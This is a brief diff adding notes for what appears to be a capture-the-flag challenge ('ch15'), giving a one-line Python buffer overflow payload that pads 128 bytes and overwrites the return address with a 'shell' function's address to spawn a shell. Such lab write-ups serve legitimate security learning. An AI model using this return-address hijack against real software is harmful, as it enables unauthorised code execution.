@@ -1,0 +1,6 @@
+* Run command
+
+** The 'a' are to fill uf he buffer
+** The hex value after that is little endian coverted address of 'shell' function
+
+(python -c 'print "a"*128+"\x16\x85\x04\x08"' ;cat) | ./ch15
